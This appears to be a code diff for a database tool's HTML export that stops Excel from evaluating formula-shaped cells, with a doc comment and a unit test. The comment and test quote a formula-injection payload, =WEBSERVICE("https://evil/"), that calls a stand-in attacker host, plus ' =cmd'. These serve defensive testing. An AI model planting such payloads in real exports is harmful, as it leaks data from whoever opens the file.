@@ -1,6 +1,8 @@
 use serde::{Deserialize, Serialize};
 use serde_json::{Map, Value};
 
+use crate::csv_export::needs_formula_guard;
+
 #[derive(Debug, Clone, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
 pub struct QueryResultTextExportData {
@@ -253,7 +255,8 @@ pub fn format_html(data: &QueryResultTextExportData) -> String {
     html.push_str("        <table>\n          <thead>\n            <tr>\n");
     for (index, col) in data.columns.iter().enumerate() {
         html.push_str(&format!(
-            "              <th><button class=\"sort-button\" type=\"button\" data-sort-column=\"{}\" aria-sort=\"none\">{}<span class=\"sort-indicator\" aria-hidden=\"true\">↕</span></button></th>\n",
+            "              <th{}><button class=\"sort-button\" type=\"button\" data-sort-column=\"{}\" aria-sort=\"none\">{}<span class=\"sort-indicator\" aria-hidden=\"true\">↕</span></button></th>\n",
+            html_formula_guard_attribute(col),
             index,
             html_escape(col)
         ));
@@ -264,10 +267,11 @@ pub fn format_html(data: &QueryResultTextExportData) -> String {
         html.push_str("            <tr>\n");
         for cell in row {
             let (text, css_class) = html_cell_value(cell);
+            let guard = html_formula_guard_attribute(&text);
             if css_class.is_empty() {
-                html.push_str(&format!("              <td>{}</td>\n", html_escape(&text)));
+                html.push_str(&format!("              <td{guard}>{}</td>\n", html_escape(&text)));
             } else {
-                html.push_str(&format!("              <td class=\"{}\">{}</td>\n", css_class, html_escape(&text)));
+                html.push_str(&format!("              <td class=\"{css_class}\"{guard}>{}</td>\n", html_escape(&text)));
             }
         }
         html.push_str("            </tr>\n");
@@ -365,6 +369,27 @@ pub fn format_html(data: &QueryResultTextExportData) -> String {
     html.push_str("    <div class=\"ftr\">Exported by DBX</div>\n");
     html.push_str("  </div>\n</body>\n</html>\n");
     html
+}
+
+/// Attribute that keeps Excel from evaluating an exported cell as a formula.
+///
+/// Excel reads an exported HTML table as sheet cells and evaluates a cell whose
+/// text looks like a formula, so a stored `=WEBSERVICE("https://evil/")` runs when
+/// the file is opened in a spreadsheet -- the same exfiltration channel #10542
+/// closed for CSV/TSV. This is measured on Excel 16.0: an unannotated `=1+1` cell
+/// arrives as the number 2, ` =cmd` executes after the leading space is dropped, and
+/// `-1+2` is promoted to `=-1+2`.
+///
+/// Excel's own text number format makes the cell plain text instead. Browsers ignore
+/// the `mso-` property, so the exported page still renders the value byte-for-byte --
+/// which matters because the HTML export's primary consumer is a browser, and the
+/// leading apostrophe the CSV/TSV writers use would be visible there.
+fn html_formula_guard_attribute(value: &str) -> &'static str {
+    if needs_formula_guard(value) {
+        r##" style="mso-number-format:'\@'""##
+    } else {
+        ""
+    }
 }
 
 fn html_escape(value: &str) -> String {
@@ -525,6 +550,51 @@ mod tests {
         assert!(out.contains("&lt;script&gt;"));
         assert!(out.contains("&amp; &quot;quoted&quot;"));
         assert!(out.contains("&#39;x&#39;"), "single quotes must be escaped");
+    }
+
+    #[test]
+    fn formats_html_keeps_excel_from_evaluating_formula_shaped_cells() {
+        // Excel reads an exported HTML table as sheet cells. Without the text number
+        // format a stored `=WEBSERVICE(...)` runs on open, ` =cmd` runs after the
+        // leading space is dropped, and `-1+2` is promoted to a formula; `+2` is
+        // silently coerced to the number 2, losing the sign. The attribute has to be
+        // on the cell itself and correctly terminated, and the value must stay
+        // untouched so a browser renders exactly what the database holds.
+        const TEXT_FORMAT: &str = " style=\"mso-number-format:'\\@'\"";
+        let guarded = |value: &str| format!("<td{TEXT_FORMAT}>{value}</td>");
+
+        let out = format_html(&QueryResultTextExportData {
+            title: None,
+            columns: vec!["=evil".to_string(), "plain".to_string()],
+            rows: vec![vec![
+                json!("=WEBSERVICE(\"https://evil/\")"),
+                json!("plain"),
+                json!("+2"),
+                json!("-1+2"),
+                json!(" =cmd"),
+                json!("-note"),
+                json!("@x"),
+                json!(42),
+                Value::Null,
+            ]],
+        });
+
+        // The same predicate the CSV/TSV writers use decides which cells are guarded.
+        for value in ["=WEBSERVICE(&quot;https://evil/&quot;)", "+2", "-1+2", " =cmd", "-note", "@x"] {
+            assert!(out.contains(&guarded(value)), "cell {value:?} must carry the text number format");
+        }
+        // Column names reach the sheet too, so a formula-shaped header is covered.
+        assert!(
+            out.contains(&format!("<th{TEXT_FORMAT}><button class=\"sort-button\"")),
+            "a formula-shaped header must carry the text number format"
+        );
+
+        // Cells Excel treats as text anyway keep the plain form, and the guard never
+        // rewrites the value (no apostrophe, unlike the CSV/TSV writers).
+        assert!(out.contains("<td>plain</td>"));
+        assert!(out.contains("<td class=\"number\">42</td>"));
+        assert!(out.contains("<td class=\"null\">NULL</td>"));
+        assert!(!out.contains("'="), "the value itself must not be prefixed");
     }
 
     #[test]
